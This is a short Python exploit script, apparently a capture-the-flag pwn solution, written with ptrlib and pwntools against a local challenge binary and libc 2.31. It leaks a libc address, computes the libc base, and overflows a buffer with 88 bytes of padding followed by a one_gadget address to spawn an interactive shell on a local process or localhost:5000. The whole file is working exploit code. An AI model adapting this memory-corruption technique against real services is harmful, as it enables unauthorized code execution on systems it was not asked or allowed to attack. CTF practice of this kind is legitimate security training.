#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.31.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendlineafter(b"?\n", b"")
    io.recvuntil(b"you, ")
    libc.base = ptr.u64(io.recvuntil(b"!", drop=True)) - 0x1F12E8

    one_gadgets = [0xE3AFE, 0xE3B01, 0xE3B04]

    payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    payload = b""
    payload += b"A" * 88
    payload += ptr.p64(libc.base + one_gadgets[1])

    io.sendlineafter(b"?\n", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
